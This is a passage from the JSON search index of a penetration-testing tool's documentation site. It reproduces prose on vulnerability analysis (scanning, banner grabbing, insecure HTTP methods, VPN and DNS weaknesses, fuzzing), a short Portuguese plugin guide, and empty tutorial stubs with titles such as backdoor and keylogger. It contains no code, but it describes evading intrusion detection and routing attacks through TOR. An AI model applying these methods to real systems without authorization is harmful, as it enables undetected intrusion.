Breadth values can include things such as target networks, segments, hosts, application, inventories, etc. At its simplest element, your testing may be to find all the vulnerabilities on a host system; while in other instances you may need to find all the vulnerabilities on hosts with in a given inventory or boundary. Additionally breadth of testing should always be validated to ensure you have met your testing scope (i.e. was every machine in the inventory alive at the time of scanning? If not, why).","title":"Testing"},{"location":"pentest_standard/vulnterability/#active","text":"Active testing involves direct interaction with the component being tested for security vulnerabilities. This could be low level components such as the TCP stack on a network device, or it could be components higher up on the stack such as the web based interface used to administer such a device. There are two distinct ways to interact with the target component: automated, and manual. '''Automated''' Automated testing utilizes software to interact with a target, examine responses, and determine whether a vulnerability exists based on those responses. An automated process can help reduce time and labor requirements. For example, while it is simple to connect to a single TCP port on a system to determine whether it is open to receive incoming data, performing this step once for each of the available 65,535 possible ports requires a significant amount of time if done manually. When such a test must be repeated on multiple network addresses, the time required may simply be too great to allow testing to be completed without some form of automation. Using software to perform these functions allows the tester to accomplish the task at hand, and focus their attention on processing data and performing tasks which are better suited to manual testing. '''Network/General Vulnerability Scanners''' ''Port Based'' An automated port based scan is generally one of the first steps in a traditional penetration test because it helps obtain a basic overview of what may be available on the target network or host. Port based scanners check to determine whether a port on a remote host is able to receive a connection. Generally, this will involve the protocols which utilize IP (such as TCP, UDP, ICMP, etc.), However, ports on other network protocols could be present as well dependent on the environment (for example, it\u2019s quite common in large mainframe environments for SNA to be in use). Typically, a port can have one of two possible states: Open - the port is able to receive data Closed - the port is not able to receive data A scanner may list other states, such as \u201cfiltered\u201d, if it is unable to accurately determine whether a given port is open or closed. When the scanner determines that a port is open, a presumption is made by the scanner as to whether a vulnerability is present or not. For example, if a port based scanner connects to TCP port 23, and that port is listening, the scanner is likely to report that the telnet service is available on the remote host, and flag it as having a clear text authentication protocol enabled. '''Service Based''' A service based vulnerability scanner is one which utilizes specific protocols to communicate with open ports on a remote host, to determine more about the service that is running on that port. This is more precise than a port scan, because it does not rely on the port alone to determine what service is running. For example, a port scan may be able to identify that TCP port 8000 is open on a host, but it will not know based on that information alone what service is running there. A service scanner would attempt to communicate with the port using different protocols. If the service running on port 8000 is able to correctly communicate using HTTP, then it will be identified as a web server. '''Banner Grabbing''' Banner grabbing is the process of connecting to a specific port and examining data returned from the remote host to identify the service/application bound to that port. Often in the connection process, software will provide an identification string which may include information such as the name of the application, or information about which specific version of the software is running. '''Web Application Scanners''' '''General application flaw scanners''' Most web application scans start with the address of a website, web application, or web service. The scanner then crawls the site by following links and directory structures. After compiling a list of webpages, file_suport, services and/or other media offered, the scanner will perform tests, or audits against the results of the crawl. For example, if a webpage discovered in the crawl has form fields, the scanner might attempt SQL injection or cross-site scripting. If the crawled page contained errors, the scanner might look for sensitive information displayed in the error detail, and so on. It should be noted that crawling and testing phases can be staggered and performed at the same time to reduce overall scanning time. This is the default behavior for many web application scanners. '''Directory Listing/Brute Forcing''' Suppose there are directories available on the website that the crawler won\u2019t find by following links. Without prior knowledge of these directories, provided by the user, the scanner has at least two additional options. The scanner/crawler can search for \u201ccommon\u201d directories. These are directories with names and variants of names that are commonly found, and are included in a list that has been compiled as the result of years of experience and scanning. Most web applications have a \u201cbuilt-in\u201d list of this sort, while some penetration testers maintain their own custom lists. Sometimes directory names are unique enough that they can be used to identify a 3 rd party web application with reasonably high accuracy. An accurate directory list can often be the key to finding the \u201cadministrative\u201d portion of a website - a portion most penetration testers should be highly interested in discovering. Brute forcing directories is a similar approach, though instead of using a static list, a tool is used to enumerate every possibility a directory name could have. The downside of using this approach is that it has the potential to crash or inundate the web server with requests and thus cause a denial-of-service condition. Care should be taken to perform directory brute forcing while someone is keeping a close watch on the condition of the web server, especially in a production setting. The reason you as the penetration tester would want to perform directory listing is to extend your attack field or to find directories that could contain sensitive information (which depending on the goal of the penetration test, may lead to a major finding within it). '''Web Server Version/Vulnerability Identification''' Many web application scanners will attempt to compare the version of the web server with known vulnerable versions in security advisories. This approach can sometimes lead to false positives; as there are some cases where open-source web servers are forked or copied and given new names, banners, and assigned different version numbers. Additional steps should be taken to verify that the web server is, in fact, running what the banner, or web scanner reports. ''Methods'' Several web server methods are considered insecure, and can allow attackers to gain varying levels of access to web server content. The fact that these methods are part of the web server software, and not web site content differentiates it from other vulnerabilities discussed thus far. Some insecure methods include: OPTIONS While the HTTP OPTIONS method is not insecure by itself, it can allow an attacker to easily enumerate the kinds of HTTP methods accepted by the target server. Note, the OPTIONS method is not always accurate and each of the methods below should be validated individually. PUT/DELETE Using the PUT method, an attacker can upload malicious content such as HTML pages that could be used to transfer information, alter web content or install malicious software on the web server. Using the DELETE method an attacker could remove content or deface a site causing a disruption of service. Additionally, modern REST applications use PUT in a different manner: Create->POST Read->GET Update->PUT Delete->DELETE WebDAV WebDAV is a component of the Microsoft Internet Information Server (IIS). WebDAV stands for \u201cWeb-based Distributed Authoring and Versioning\u201d and is used for editing and file management. WebDAV extensions are used by administrators to manage and edit Web content remotely on IIS Web servers and can include PROPFIND, COPY, MOVE, PROPPATCH, MKCOL, LOCK, and UNLOCK .WebDAV interacts with core operating system components, which can expose a system to several possible vulnerabilities. Some of these potential risks include: Buffer overflow conditions due to improper handling of user requests Denial-of-service conditions from malformed requests Domain based scripting attacks Privilege escalation Execution of arbitrary code TRACE/TRACK Modern web servers support the TRACE HTTP method, which contains a flaw that can lead to unauthorized information disclosure. The TRACE method is used to debug web server connections and can allow the client to see what is being received at the other end of the request chain. Enabled by default in all major web servers, a remote attacker may abuse the HTTP TRACE functionality to disclose sensitive information resulting in a loss of confidentiality. '''Network Vulnerability Scanners/Specific Protocols''' '''VPN''' Conventional vulnerability assessment tools are not capable of performing the correct protocol negotiations with VPN devices that service Internet Key Exchange (IKE). In situations where IKE is in use, it will be necessary to use additional toolkits that can perform functions such as accurate fingerprinting, back off patterns and identify authentication mechanisms that are in use. By identifying these attributes of a VPN device, weaknesses can be identified in running code versions as well as authentication types such as static preshared keys. '''Voice Network Scanners''' ''War Dialing'' Many organizations still utilize out of band access over telephone lines. Using vulnerability assessment tools that are designed to conduct war-dialing can determine weaknesses in authentication and network architecture. ''VoIP'' Voice over IP technologies are now abundant within most organizations. Many tools have been developed to conduct vulnerability analysis of VoIP infrastructures. Using these tools, one can identify if VoIP networks are properly segmented and potentials for leveraging these networks to access core infrastructure systems or record phone conversations on a target network may exist. '''Manual Direct Connections''' As with any automated process or technology, the margin for error always exists. Instabilities in systems, network devices and network connectivity may introduce inaccurate results during testing. It is always recommended to execute manual direct connections to each protocol or service available on a target system to validate the results of automated testing as well as identifying all potential attack vectors and previously unidentified weaknesses. '''Obfuscated''' ''Multiple Exit Nodes'' Security monitoring and defense systems operate under the pretense of identifying malicious activity from a specific IP address. In situations where Intrusion Detection systems are deployed and monitoring activity, sourcing assessment and attack activities from multiple IP addresses provide more accurate results and lessen the opportunity for a monitoring device on a target network to identify and respond. Technologies such as TOR proxies can provide a means to conduct assessment activities without sourcing from a single IP address. ''IDS Evasion'' When conducting assessment activities against a target environment where IDS technologies are deployed, it may be necessary to perform evasion. Using methods such as string manipulation, polymorphism, session splicing, and fragmentation can provide more accurate results while bypassing signature matching patterns implemented in IDS devices.","title":"Active"},{"location":"pentest_standard/vulnterability/#passive","text":"'''Metadata Analysis''' Metadata analysis involves looking at data that describes a file, as opposed to the file data itself. A Microsoft Office document for example, might list the document author, company, when the document was last saved, when the document was created, and so on. Many documents even allow for the entry of custom metadata. This could potentially contain internal addresses and paths to servers, internal IP addresses, and other information a penetration tester could use to gain additional access or information. Though metadata is quite common on documents located on a company\u2019s internal network, companies should take care to purge metadata before making documents available to the public, or on the public Internet. For this reason, any metadata an attacker could gain access to passively (without directly attacking the target) should be considered a security issue. '''Traffic Monitoring''' Traffic monitoring is the concept of connecting to an internal network and capturing data for offline analysis. Route poisoning is excluded from this phase as these create \u201cnoise\u201d on the network and can easily be detected. It is often surprising how much sensitive data can be gleaned from a \u201cswitched\u201d network. This \u201cleaking of data\u201d onto a switched network can be categorized as follows: ARP/MAC cache overflow, causing switched packets to be broadcast - this is common on Cisco switches that have improper ARP/MAC cache timing configurations. Etherleak - some older network drivers and some embedded drivers will use data from system memory to pad ARP packets. If enough ARP packets can be collected, sensitive information from internal memory can be captured Misconfigured clusters or load balancers Hubs plugged into the network Note that some of these categories only result in data leakage to a single subnet, while others can result in leakage to much larger network segments.","title":"Passive"},{"location":"pentest_standard/vulnterability/#validation","text":"'''Correlation between Tools''' When working with multiple tools the need for correlation of findings can become complicated. Correlation can be broken down into two distinct styles, specific and categorical correlation of items, both are useful based on the type of information, metrics and statistics you are trying to gather on a given target. Specific correlation relates to a specific definable issue such as vulnerability ID, CVE, OSVDB, vendor indexing numbers, known issue with a software product, etc. and can be grouped with micro factors such as hostname, IP, FQDN, MAC Address etc. An example of this would be grouping the findings for host x by CVE number as they would index the same issue in multiple tools. Categorical correlation relates to a categorical structure for issues such as in compliance frameworks (i.e. NIST SP 800-53, DoD 5300 Series, PCI, HIPPA, OWASP List, etc.) that allow you to group items by macro factors such as vulnerability types, configuration issues, etc. An example of this would be grouping all the findings for hosts with default passwords into a group for password complexity within NIST 800-53 (IA-5). In most cases penetration testers are going to focus on the micro issues of specific vulnerabilities found in redundancy between multiple tools on the same host. This redundancy can skew the statistical results in the test output leading to a false increased risk profile. The inverse of this is with an over reduction or simplification in macro correlation (i.e. top 10/20 lists) as the results can skew the output resulting in a false reduced risk profile. '''Manual Testing/Protocol Specific''' '''VPN''' ''Fingerprinting'' Fingerprinting is useful to determine the type of VPN device and correct version of code released installed. By accurately fingerprinting the device, proper research and analysis can then be conducted against the target system. ''Authentication'' VPN devices can operate with various forms of authentication. Using VPN toolkits that are not part of conventional vulnerability assessment tools allow for proper identification of the authentication mechanisms and determine weaknesses that may exist such as pre-shared keys or default group IDs. '''Citrix''' ''Enumeration'' Many default installations and poorly configured Citrix appliances provide a means to enumerate published applications and determine valid usernames that are configured to authenticate to the device. This information becomes crucial during brute force attacks and attempts to break out of predefined profiles for authorized users. '''DNS''' Domain Name Systems can offer an abundance of information to an attacker when they are not properly hardened. Version information allow for proper identification and accurate research analysis. Weaknesses such as zone transfers provide an exhaustive list of additional targets for attack as well as information leakage of potentially sensitive data pertaining to the target organization. '''Web''' Web services provide a large landscape for an attacker. Unlike most other protocols and services, web services are often found running on multiple ports of a single system. Administrators may focus their hardening on the common ports for web services or published directories and neglect to properly harden additional attributes. Web services should always be reviewed in a manual fashion as automated assessment tools are not capable of identifying most weaknesses in their services. '''Mail''' Mail servers can provide an abundance of information about a target organization. Using inherent functions in the target device, confirmation of valid accounts can be conducted as well as developing a list of potential usernames for additional attacks on other systems. Vulnerabilities such as mail relaying can be leveraged for additional attacks on the organization such as phishing. Often, mail servers will provide a web interface for remote access that can be targeted in brute force campaigns. '''Attack Avenues''' '''Creation of attack trees''' During a security assessment, it is crucial to the accuracy of the final report to develop an attack tree as testing progresses throughout the engagement. As new systems, services and potential vulnerabilities are identified; an attack tree should be developed and regularly updated. This is especially important during the exploitation phases of the engagement as one point of entry that materializes could be repeated across other vectors mapped out during the development of the attack tree. '''Isolated Lab Testing''' The accuracy of vulnerability analysis and exploitation is substantially greater when replicated environments are setup in an isolated lab. Often times, systems may be hardened with specific control sets or additional protection mechanisms. By designing a lab that mimics that of the target organization, the consultant can ensure that the vulnerabilities identified and exploits attempted against the desired targets are reliable and lessen the opportunity for inaccurate results or system inoperability. '''Visual Confirmation''' ''Manual Connection with Review'' While proper correlation can help reduce false findings and increase overall accuracy, there is no substitute for visually inspecting a target system. Assessment tools are designed to review the results of a protocol/service connection or the response and compare to known signatures of vulnerabilities. However, tools are not always accurate in identifying services on uncommon ports or custom logic that may be built into an application. By manually assessing a target system, its services available and the applications that provide functionality for those services, a tester can ensure that proper validation and vulnerability identification have been completed.","title":"Validation"},{"location":"pentest_standard/vulnterability/#research","text":"'''Public Research''' Once a vulnerability has been reported in a target system, it is necessary to determine the accuracy of the identification of the issue, and to research the potential exploitability of the vulnerability within the scope of the penetration test. In many cases, the vulnerability will be a reported software vulnerability in a commercial or open source software package, and in other cases the vulnerability can be a flaw in a business process, or a common administrative error like misconfiguration or default password usage. ''Vulnerability Databases'' Vulnerability databases can be used to verify an issue reported by an automated tool, or to manually review the vulnerability of a target application. Most tools will use the CVE identifier for a given vulnerability, which can be used to access the summary information and links to other sources in the CVE database. The CVE can also be used to search for the issue in vulnerability databases like OSVDB and Bugtraq, or in exploit databases and frameworks. Vulnerability databases should be used to verify the accuracy of a reported issue. For example, an Apache web server flaw can exist on Windows, but not on Linux, which may not be taken into account by an automated scanner. ''Vendor Advisories'' Vendor-issued security advisories and change logs can provide pointers to vulnerability information that may not be reported by any automated tools. Many major software vendors report limited details on internally discovered issues and issues where an independent researcher coordinates the disclosure of a vulnerability. If the researcher chooses to remain silent on the details of the vulnerability, the vendor advisory is frequently the only data available. In these cases, other researchers may discover more details independently, and add the details to vulnerability databases. Searching for the CVE used in a vendor advisory may turn up more detail on a potentially exploitable issue. Change logs can provide guidance for additional research, especially in open source products, where a diff between versions can reveal a vulnerability which was fixed but not widely known, and perhaps not prioritized for upgrade or installation as a result. '''Exploit Databases and Framework Modules''' Many exploit databases are actively maintained and publicly accessible on the Internet. Security researchers and exploit writers do not always submit their exploit code to multiple sites, so it is advisable to become familiar with several sites, and check each one for exploit code to use against potentially vulnerable applications. While some vulnerability databases track exploit availability, their coverage is usually incomplete and should not be considered exhaustive. Commercial and open source exploit frameworks can also prove useful in researching vulnerabilities. In most cases, available exploit modules are listed on their public web sites, and can be a valuable indication of the exploitability of an issue. '''Common/default Passwords''' Frequently, administrators and technicians choose weak passwords, never change the default or do not set any password at all. Manuals for most software and hardware can be easily found online, and will provide the default credentials. Internet forums and official vendor mailing lists can provide information on undocumented accounts, commonly-used passwords and frequently misconfigured accounts. Finally, many web sites document default/backdoor passwords and should be checked for every identified system. '''Hardening Guides/Common Misconfigurations''' One of the primary goals of penetration testing is to simulate the tactics and behavior of an actual attacker. While automated scanning can reduce the time window of a test, no scanner can behave like a human being. Hardening guides can be an invaluable reference for a penetration tester. They not only highlight the weakest parts of a system, but you can gain a sense of the diligence of an administrator by validating how many recommendations have been implemented. During every penetration test, time should be taken to review every major system and its recommended hardening settings, in order to discover vulnerabilities left in place by the administrator. User forums and mailing lists can provide valuable information about systems and the various issues administrators have in configuring and securing them. A tester should research target systems as if he were installing one himself, and discover where the pain points and probable configuration errors will lie. '''Private Research''' ''Setting up a replica environment'' Virtualization technologies allow a security researcher to run a wide variety of operating systems and applications, without requiring dedicated hardware. When a target operating system or application has been identified, a virtual machine (VM) environment can be quickly created to mimic the target. The tester can use this VM to explore to configuration parameters and behaviors of the application, without directly connecting to the target. ''Testing Configurations'' A testing VM lab should contain base images for all common operating systems, including Windows XP, Vista, 7, Server 2003 and Server 2008, Debian, Ubuntu, Red Hat and Mac OS X, where possible. Maintaining separate images for each service pack level will streamline the process of recreating the target\u2019s environment. A complete VM library in combination with a VM environment that supports cloning will allow a tester to bring up a new target VM in minutes. Additionally, using a snapshot feature will allow to work more efficiently and to reproduce bugs. ''Fuzzing'' Fuzzing, or fault injection, is a brute-force technique for finding application flaws by programmatically submitting valid, random or unexpected input to the application. The basic process involves attaching a debugger to the target application, and then running the fuzzing routine against specific areas of input and then analyzing the program state following any crashes. Many fuzzing applications are available, although some testers write their own fuzzers for specific targets. '''Identifying potential avenues/vectors''' Log in or connect to a target network application to identify commands and other areas of input. If the target is a desktop application that reads files and/or web pages, analyze the accepted file formats for avenues of data input. Some simple tests involve submitting invalid characters, or very long strings of characters to cause a crash. Attach a debugger to analyze the program state in the event of a successful crash. '''Disassembly and code analysis''' Some programming languages allow for decompilation, and some specific applications are compiled with symbols for debugging. A tester can take advantage of these features to analyze program flow and identify potential vulnerabilities. Source code for open source applications should be analyzed for flaws. Web applications written in PHP share many of the same vulnerabilities, and their source code should be examined as part of any test.","title":"Research"},{"location":"plugins/plugin-creation/","text":"Guia de desenvolvimento de Plugins Vis\u00e3o Geral Para escrever um plugin e utiliz\u00e1-lo no THG primeiro \u00e9 necess\u00e1rio: O plugin precisa ser class e o nome da classe deve ser Plugin A classe Plugin deve herdar lib.thg.thgcmd.cmd2 Deve conter um m\u00e9todo chamado __init__ que deve chamar o m\u00e9todo __init__ da classe pai super().__init__(*args, **kwargs) Deve conter um m\u00e9todo chamado onLoad(self, args_raw) com os par\u00e2metros self e args_raw Como carregar o plugin: Basta utilizar o comando plugin <nome do plugin>","title":"Guia de desenvolvimento de Plugins"},{"location":"plugins/plugin-creation/#guia-de-desenvolvimento-de-plugins","text":"","title":"Guia de desenvolvimento de Plugins"},{"location":"plugins/plugin-creation/#visao-geral","text":"Para escrever um plugin e utiliz\u00e1-lo no THG primeiro \u00e9 necess\u00e1rio: O plugin precisa ser class e o nome da classe deve ser Plugin A classe Plugin deve herdar lib.thg.thgcmd.cmd2 Deve conter um m\u00e9todo chamado __init__ que deve chamar o m\u00e9todo __init__ da classe pai super().__init__(*args, **kwargs) Deve conter um m\u00e9todo chamado onLoad(self, args_raw) com os par\u00e2metros self e args_raw","title":"Vis\u00e3o Geral"},{"location":"plugins/plugin-creation/#como-carregar-o-plugin","text":"Basta utilizar o comando plugin <nome do plugin>","title":"Como carregar o plugin:"},{"location":"tutorials/thg/","text":"dark","title":"THG"},{"location":"tutorials/thg/#dark","text":"","title":"dark"},{"location":"tutorials/anti_forensic/anti_forensic/","text":"","title":"thg_anti_forensic"},{"location":"tutorials/automation/automation/","text":"","title":"thg_automation"},{"location":"tutorials/automobile/automobile/","text":"","title":"thg_automobile"},{"location":"tutorials/auxiliares/auxiliares/","text":"","title":"thg_auxiliares"},{"location":"tutorials/backdoor/backdoor/","text":"","title":"thg_backdoor"},{"location":"tutorials/binary/binary/","text":"","title":"thg_binary"},{"location":"tutorials/bluetooth/bluetooth/","text":"","title":"thg_bluetooth"},{"location":"tutorials/code_audit/code_audit/","text":"","title":"thg_code_audit"},{"location":"tutorials/cracker/cracker/","text":"","title":"thg_cracker"},{"location":"tutorials/crypto/crypto/","text":"","title":"thg_crypto"},{"location":"tutorials/cryptography/cryptography/","text":"","title":"thg_cryptography"},{"location":"tutorials/database/database/","text":"","title":"thg_database"},{"location":"tutorials/debugger/debugger/","text":"","title":"thg_debugger"},{"location":"tutorials/decompiler/decompiler/","text":"","title":"thg_decompiler"},{"location":"tutorials/defensensive/defensensive/","text":"","title":"thg_defensensive"},{"location":"tutorials/defensive/defensive/","text":"","title":"thg_defensive"},{"location":"tutorials/disassembler/disassembler/","text":"","title":"thg_disassembler"},{"location":"tutorials/dos/dos/","text":"","title":"thg_dos"},{"location":"tutorials/drone/drone/","text":"","title":"thg_drone"},{"location":"tutorials/exploitation/exploitation/","text":"","title":"thg_exploitation"},{"location":"tutorials/fingerprint/fingerprint/","text":"","title":"thg_fingerprint"},{"location":"tutorials/firmware/firmware/","text":"","title":"thg_firmware"},{"location":"tutorials/forensic/forensic/","text":"","title":"thg_forensic"},{"location":"tutorials/gpu/gpu/","text":"","title":"thg_gpu"},{"location":"tutorials/hardware/hardware/","text":"","title":"thg_hardware"},{"location":"tutorials/honeypot/honeypot/","text":"","title":"thg_honeypot"},{"location":"tutorials/ids/ids/","text":"","title":"thg_ids"},{"location":"tutorials/keylogger/keylogger/","text":"","title":"thg_keylogger"},{"location":"tutorials/malware/malware/","text":"","title":"thg_malware"},{"location":"tutorials/misc/misc/","text":"","title":"thg_misc"},{"location":"tutorials/mobile/mobile/","text":"","title":"thg_mobile"},{"location":"tutorials/networking/networking/","text":"","title":"thg_networking"},{"location":"tutorials/nfc/nfc/","text":"","title":"thg_nfc"},{"location":"tutorials/os/os/","text":"","title":"thg_os"},{"location":"tutorials/packer/packer/","text":"","title":"thg_packer"},{"location":"tutorials/proxy/proxy/","text":"","title":"thg_proxy"},{"location":"tutorials/radio/radio/","text":"","title":"thg_radio"},{"location":"tutorials/recon/recon/","text":"","title":"thg_recon"},{"location":"tutorials/reversing/reversing/","text":"","title":"thg_reversing"},{"location":"tutorials/server/server/","text":"","title":"thg_server"},{"location":"tutorials/shells/shells/","text":"","title":"thg_shells"},{"location":"tutorials/sniffer/sniffer/","text":"","title":"thg_sniffer"},{"location":"tutorials/social/social/","text":"","title":"thg_social"},{"location":"tutorials/spoff/spoff/","text":"","title":"thg_spoff"},{"location":"tutorials/spoof/spoof/","text":"","title":"thg_spoof"},{"location":"tutorials/stego/stego/","text":"","title":"thg_stego"},{"location":"tutorials/thg_docs/thg_docs/","text":"","title":"thg_docs"},{"location":"tutorials/thg_windows/thg_windows/","text":"","title":"thg_windows"},{"location":"tutorials/tunnel/tunnel/","text":"","title":"thg_tunnel"},{"location":"tutorials/unpacker/unpacker/","text":"","title":"thg_unpacker"},{"location":"tutorials/version/version/","text":"","title":"thg_version"},{"location":"tutorials/voip/voip/","text":"","title":"thg_voip"},{"location":"tutorials/wireless/wireless/","text":"","title":"thg_wireless"}]}